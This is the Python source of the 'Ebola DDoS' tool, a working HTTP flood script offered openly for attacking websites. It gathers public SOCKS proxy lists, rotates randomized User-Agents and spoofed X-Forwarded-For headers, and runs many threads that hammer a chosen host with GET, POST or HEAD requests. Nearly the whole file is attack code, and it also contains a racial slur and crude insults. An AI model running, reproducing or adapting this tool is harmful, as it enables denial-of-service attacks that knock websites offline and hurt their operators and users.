#    #################################################      #
##           Ebola DDoS Will Stop Update For While         ##         
##   So This Update Will Be Last Version For A Long Time   ##
##        Visit Our Home Page For More DDoS/DoS Script     ##
#             ---> https://freethecode.cf/ <---             #
#    ###################################################    #
import socket
import threading
import random
import sys
import os
import ssl
import time

if os.name =="nt":
    os.system("cls")
else:
    os.system("clear")

print("""

      ▓█████  ▄▄▄▄    ▒█████   ██▓    ▄▄▄   Ebola DDoS Tool Code By 413xPr06605.
3     ▓█   ▀ ▓█████▄ ▒██▒  ██▒▓██▒   ▒████▄         Windows/Linux Supported Ver.
 1    ▒███   ▒██▒ ▄██▒██░  ██▒▒██░   ▒██  ▀█▄                Socks4/5 Supported.
8 4   ▒▓█  ▄ ▒██░█▀  ▒██   ██░▒██░   ░██▄▄▄▄██                Version ~ # 1.5.0,
 2    ░▒████▒░▓█  ▀█▓░ ████▓▒░░██████▒▓█   ▓██▒
  3   ░░ ▒░ ░░▒▓███▀▒░ ▒░▒░▒░ ░ ▒░▓  ░▒▒   ▓▒█░ [+] All Parameter Optimization
      ░ ░  ░▒░▒   ░   ░ ▒ ▒░ ░ ░ ▒  ░ ▒   ▒▒ ░  [+] Fix Location Module
         ░    ░    ░ ░ ░ ░ ▒    ░ ░    ░   ▒    [+] More Powerful Brute Mode
        ░  ░ ░      ░   ░ ░      ░  ░     ░  ░
                    ░     There Is No Hope, For The Broken Heart\n""")

new_host = ""
brute = ""
sock_version = "5"
ipfile = "socks5.txt"
attack_type = "GET"
brute = "OFF"
nums = 0
suc = 0
bp = 0
useragents = []
string = ["id","q","a","s","page","result","search","login","user","nigga","ebola","hiv","covid","h1n1","language","data"]

def check_all_ip_x_y(database,ip_list):
	info = {}
	for ip in ip_list:
		ip = ip.strip().split(":")
		try:
			info[ip[0]] = [database.get_latitude(ip[0]),database.get_longitude(ip[0])]#dirty fix
		except:
			pass

	return info

def setup():
	f = open(ipfile,"r")
	ip_list = f.readlines()
	f.close()
	database = IP2Location.IP2Location(os.path.join("IP2LOCATION-LITE-DB5.BIN"))
	info = check_all_ip_x_y(database,ip_list)
	world_map = folium.Map([0.000000,0.000000],zoom_start=3)
	for ip in info:
		world_map.add_child(
			folium.CircleMarker(
				[info[ip][0], info[ip][1]],
				radius=4,
				color='red',
				fill=True,
				fill_color='white',
				fill_opacity=0.6
			)
		)
	#world_map.render()
	world_map.save("ebola.html")

def extractZIP():
    print("\nCheck File Response => IP2LOCATION-LITE-DB5.BIN")
    if os.path.exists("IP2LOCATION-LITE-DB5.BIN") != True:
	    if os.path.exists("IP2LOCATION-LITE-DB5.zip") != True:
		    print("\n - - - Downloading IP Info data - - - \n")
		    r = requests.get("https://freethecode.cf/IP2LOCATION-LITE-DB5.zip")
		    with open("IP2LOCATION-LITE-DB5.zip","wb") as f:
			    f.write(r.content)
	    with zipfile.ZipFile("IP2LOCATION-LITE-DB5.zip","r") as myzip:
		    myzip.extract("IP2LOCATION-LITE-DB5.BIN")
	    print("File Save as \"IP2LOCATION-LITE-DB5.BIN\"\n")	
    maplist = str(input("Create Ebola Virus Map (y/n) : "))
    if maplist =="y" or maplist =="" or maplist =="Y":
	    setup()
	    print("Ebola Virus Map Sucess Created as \"ebola.html\"\n")
    else:
	    pass

def clone_socks():
    f = open("socks5.txt","wb")
    try:
        r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=10000&country=all",timeout=5)
        f.write(r.content)
    except:
        pass
    try:
        r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks5",timeout=5)
        f.write(r.content)
    except:
        pass
    try:
        r = requests.get("https://www.proxyscan.io/download?type=socks5",timeout=5)#nice "request.get"
        f.write(r.content)
        f.close()
    except:
        f.close()
    g = open("socks4.txt","wb")
    try:
        r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&timeout=10000&country=all",timeout=5)
        g.write(r.content)
    except:
        pass
    try:
        r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks4",timeout=5)
        g.write(r.content)
    except:
        pass
    try:
        r = requests.get("https://www.proxyscan.io/download?type=socks4",timeout=5)#nice "request.get"
        g.write(r.content)
        g.close()
    except:
        g.close()

def GenUA():
    AW = str(random.randint(500,599))+".36"
    BV = str(random.randint(24,80))+".0."+str(random.randint(3000,4000))+"."+str(random.randint(1,200))
    OPR = str(random.randint(30,70))+".0."+str(random.randint(1000,4000))+"."+str(random.randint(1,1000))
    UCB = str(random.randint(5,12))+"."+str(random.randint(5,12))+"."+str(random.randint(0,10))+"."+str(random.randint(1,1000))
    devices = random.choice(
        [
            "IOS",
            "Windows",
            "X11",
            "Android",
            "Symbian",
            "Macintosh"
        ]
    )
    if devices =="Windows":
        version = random.choice(
            [
                "Windows NT 10.0; Win64; X64",
                "Windows NT 10.0; WOW64",
                "Windows NT 5.1; rv:7.0.1",
                "Windows NT 6.1; WOW64; rv:54.0",
                "Windows NT 6.3; Win64; x64",
                "Windows NT 6.3; WOW64; rv:13.37"
            ]
        )
    elif devices =="IOS":
        version = random.choice(
            [
                "iPhone; CPU iPhone OS 13_3 like Mac OS X",
                "iPad; CPU OS 13_3 like Mac OS X",
                "iPod touch; iPhone OS 4.3.3",
                "iPod touch; CPU iPhone OS 12_0 like Mac OS X"
            ]
        )
    elif devices =="X11":
        version = random.choice(
            [
                "X11; Linux x86_64",
                "X11; Ubuntu; Linux i686",
                "SMART-TV; Linux; Tizen 2.4.0",
                "X11; Ubuntu; Linux x86_64",
                "X11; U; Linux amd64",
                "X11; GNU/LINUX",
                "X11; CrOS x86_64 11337.33.7",
                "X11; Debian; Linux x86_64"
            ]
        )
    elif devices =="Android":
        version = random.choice(
            [
                "Linux; Android 4.2.1; Nexus 5 Build/JOP40D",
                "Linux; Android 4.3; MediaPad 7 Youth 2 Build/HuaweiMediaPad",
                "Linux; Android 4.4.2; SAMSUNG GT-I9195 Build/KOT49H",
                "Linux; Android 5.0; SAMSUNG SM-G900F Build/LRX21T",
                "Linux; Android 5.1.1; vivo X7 Build/LMY47V",
                "Linux; Android 6.0; Nexus 5 Build/MRA58N",
                "Linux; Android 7.0; TRT-LX2 Build/HUAWEITRT-LX2",
                "Linux; Android 8.0.0; SM-N9500 Build/R16NW",
                "Linux; Android 9.0; SAMSUNG SM-G950U"
            ]
        )
    elif devices =="Macintosh":
        version = random.choice(
            [
                "Macintosh; Intel Mac OS X 10_14_4",
                "Macintosh; U; Intel Mac OS X 12_10_0"
            ]
        )
    elif devices =="Symbian":
        version = random.choice(
            [
                "Series40; Nokia200/11.56; Profile/MITP-2.1 Configuration/CLDC-1.1",
                "SymbianOS/9.1; U; en-us",
                "Series30Plus; Nokia220/10.03.11; Profile/Series30Plus Configuration/Series30Plus"
            ]
        )
    borwser = random.choice(["chrome","uc","op"])
    if borwser =="chrome":
        return "User-Agent: Mozilla/5.0 ("+version+") AppleWebKit/"+ AW +" (KHTML, like Gecko) Chrome/"+ BV + " Safari/"+ AW
    elif borwser =="op":
        return "User-Agent: Mozilla/5.0 ("+version+") AppleWebKit/"+ AW +" (KHTML, like Gecko) Chrome/"+ BV + " Safari/"+ AW +" OPR/" + OPR
    elif borwser =="uc":
        return "User-Agent: Mozilla/5.0 ("+version+") AppleWebKit/"+ AW +" (KHTML, like Gecko) Version/4.0 Chrome/"+ BV + " UCBrowser/" + UCB + " Safari/"+ AW

def checking_socks(lines,):
    global nums
    global suc
    try:
        proxy = lines.strip().split(":")
        if sock_version =="5":
            socks.setdefaultproxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]), 1)
        else:
            socks.setdefaultproxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]), 1)
    except:
        proxies.remove(lines)
        print("[%s] Connection-[Failed]"%(proxy[0]))
        return
    err = 0
    while 1:
        if err == 3:
            proxies.remove(lines)
            print("[%s] Connection-[Failed]"%(proxy[0]))
            break
        try:
            s = socks.socksocket()
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
            s.settimeout(5)
            s.connect((str(host), int(port)))
            if port == 443:
                ssl_socket = ssl.SSLContext()
                s = ssl_socket.wrap_socket(s, server_hostname=host)
            s.send(str.encode("GET / HTTP/1.1\r\nHost: "+host+"\r\n\r\n"))
            s.close()
            suc +=1
            print("[%s] Connection-[Connected]"%(proxy[0]))
            print('\33]0;[%s] EbolaVirus-[Load]\a'%(suc),end='')
            break
        except:
            s.close()
            err +=1
            print("[%s] Connection-[Failed]"%(proxy[0]))
    nums += 1

def check_socks():
    global nums
    global suc
    thread_list=[]
    for lines in list(proxies):
        th = threading.Thread(
            target=checking_socks,
            args=(
                lines,
            )
        )
        th.start()
        thread_list.append(th)
        time.sleep(0.01)
        sys.stdout.flush()
    for th in list(thread_list):
        th.join()
        sys.stdout.flush()
    with open(ipfile, 'wb') as fp:
        for lines in list(proxies):
            fp.write(
                bytes(
                    lines,
                    encoding='utf8'
                )
            )
    fp.close()
    print('\33]0;[%s] EbolaVirus-[Ready]\a'%(suc),end='')

def ins_module():
    if os.name =="nt":
        os.system("py -m pip install requests pysocks IP2Location folium")
    else:
        os.system("pip3 install requests pysocks IP2Location folium")

def flood(x):
    if x < len(proxies):
        proxy = proxies[x].strip().split(":")
    else:
        proxy = random.choice(proxies).strip().split(":")
    verHost = " HTTP/1.1\r\nHost: " + host + "\r\n"
    connection = "Connection: Keep-Alive:823\r\n"
    useragent = useragents[x] + "\r\n"
    accept = "Accept: */*\r\n"
    fake_addr = "X-Forwarded-For: 1.1.1.1, 8.8.8.8, 1.0.0.1\r\n"
    referer = "Referer: http://netsec-reborn.onion/ebola-virus?id="+host+"\r\n"
    if attack_type =="POST":
        content = "X-Requested-With: XMLHttpRequest\r\nContent-Type: application/x-www-form-urlencoded; charset=utf-8\r\n"
        length = "Content-Length: 16\r\n\nEbola-Virus-DDoS\r\n\r\n"
    else:
        content = "\r"
        length = "\n"
    event.wait()
    if bp ==1:
        pass
    else:
        sys.exit()
    while 1:
        try:
            s = socks.socksocket()
            if sock_version =="5":
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            else:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.connect_ex((host, port))
            if port ==443:
                sslsocket = ssl.SSLContext()
                s = sslsocket.wrap_socket(s, server_hostname=host)
            try:
                for _ in range(100):
                    http = attack_type + " " + path + "?" + random.choice(string) + "=" + str(random.randint(1,65535))
                    http2 = "&"+random.choice(string)+"?="+str(random.randint(1,65535))
                    #if attack_type =="POST":
                    #    http = attack_type + " / HTTP/1.1\r\nHost: " + host + "\r\n"
                    request = http + http2 + verHost + connection + accept + fake_addr + useragent + referer + content + length
                    if brute =="ON":
                        request = http + verHost + connection + fake_addr + accept + content + length
                    s.send(str(request).encode())
                    s.send(str(request).encode())
                s.close()
                print("[%s] %s %s"%(proxy[0], host, http))
            except:
                s.close()
        except:
            s.close()

if len(sys.argv) < 5:
    print("Usage : %s <host> <port> <threads> <path>"%(sys.argv[0]))
    print("              --help For More Information\n")
    if len(sys.argv) ==2:
        if str(sys.argv[1]) =="--help":
            print(" --install   | Auto Install Module")
            print(" --createmap | Launch Proxy Map Setup")
            print(" --check     | Check Socks Connection")
            print(" --clone     | Download Socks List")
            print(" --file      | Input Custom Socks File")
            print(" --brute     | Enable Brute Mode")
            print(" --socks4    | Using Socks4 DDoS")
            print(" --socks5    | Using Socks5 DDoS")
            print("\nAttacking Method Can Be Change Like\n")
            print(" --method=GET")
            print(" --method=POST")
            print(" --method=HEAD\n")
            sys.exit()
        elif str(sys.argv[1]) == "--install":
            ins_module()
            pass
        elif str(sys.argv[1]) =="--createmap":
            try:
                import folium
                import IP2Location
                import zipfile
            except:
                if os.name =="nt":
                    os.system("py -m pip install folium IP2Location")
                else:
                    os.system("pip3 install folium IP2Location")
            extractZIP()
            pass
        else:
            pass
    else:
        pass
    sys.exit()

host = str(sys.argv[1])
if "http://" in host:
    for _ in range((len(host)-7)):
        new_host += host[_+7]
    host = new_host
elif "https://" in host:
    for _ in range((len(host)-8)):
        new_host += host[_+8]
    host = new_host
if ".edu" in host or ".gov" in host or "bank" in host or ".tw" in host:
    print("\n  > %s < \n"%(host))
    print("\nThis Url Can't Be Ebola's Target\n\n")
    print("Go Fuck Yourself Skid !")
    sys.exit()
else:
    pass
    bp = 1
port = int(sys.argv[2])
thr = int(sys.argv[3])
path = str(sys.argv[4])

if "--install" in sys.argv:
    ins_module()

try:
    import requests
    import socks
except:
    if os.name =="nt":
        os.system("cls")
        print("Run ~# \'py %s --install\'\nCan Auto Install Module")
        sys.exit()
    else:
        os.system("clear")
        print("Run ~# \'python3 %s --install\'\nCan Auto Install Module")
        sys.exit()

if "--createmap" in sys.argv:
    try:
        import folium
        import IP2Location
        import zipfile
    except:
        if os.name =="nt":
            os.system("py -m pip install folium IP2Location")
        else:
            os.system("pip3 install folium IP2Location")
    extractZIP()
else:
    pass

if "--clone" in sys.argv:
    clone_socks()
    if "--socks5" in sys.argv:
        sock_version = "5"
        ipfile = "socks5.txt"
    elif "--socks4" in sys.argv:
        sock_version = "4"
        ipfile = "socks4.txt"
    else:
        sock_version = "5"
        ipfile = "socks5.txt"
else:
    pass

if "--file" in sys.argv:
    ipfile = str(input("Input Custon File : "))
    proxies = open(ipfile).readlines()
    if "--socks5" in sys.argv:
        sock_version = "5"
    elif "--socks4" in sys.argv:
        sock_version = "4"
    else:
        pass
else:
    pass

if len(sys.argv) ==5:
    if "--socks5" in sys.argv:
        sock_version = "5"
        ipfile = "socks5.txt"
    elif "--socks4" in sys.argv:
        sock_version = "4"
        ipfile = "socks4.txt"
    else:
        pass
    proxies = open(ipfile).readlines()
    if len(proxies) ==0:
        print("No Available Socks Found")
        print("Use --file To Set Custom File")
        print("Or Use --clone To Auto Download Socks")
        sys.exit()
    else:
        pass
else:
    pass

if "--check" in sys.argv:
    proxies = open(ipfile).readlines()
    check_socks()
else:
    proxies = open(ipfile).readlines()
    if len(proxies) ==0:
        print("No Available Socks Found")
        print("Use --socks5 or --socks4 Set Socks Version")
        print("Or Use --clone To Auto Download Socks")
        sys.exit()
    else:
        print('\33]0;[%s] EbolaVirus-[Ready]\a'%(len(proxies)),end='')

if "--method=GET" in sys.argv:
    attack_type = "GET"
else:
    pass
if "--method=POST" in sys.argv:
    attack_type = "POST"
else:
    pass
if "--method=HEAD" in sys.argv:
    attack_type = "HEAD"
else:
    pass

if "--brute" in sys.argv:
    brute = "ON"
else:
    pass

event = threading.Event()

for _ in range(thr):
    ua = GenUA()
    useragents.append(ua)

for x in range(thr):
    threading.Thread(target=flood, daemon=True, args=(x,)).start()

print("\nHost Set As => %s "%(host))
time.sleep(1)
print("Port => %s"%(port))
time.sleep(1)
print("Socks Version => %s"%(sock_version))
time.sleep(1)
print("Total Ebola Socks => %s"%(len(proxies)))
time.sleep(1)
print("Request Method => %s"%(attack_type))
if brute =="ON":
    print("Brute Mode => Enable")
else:
    print("Brute Mode => Disable")
time.sleep(1)

input("\nEnter For Launch Ebola DDoS Attack\n")
event.set()
while 1:
    try:
        input()
        sys.exit()
    except:
        sys.exit()
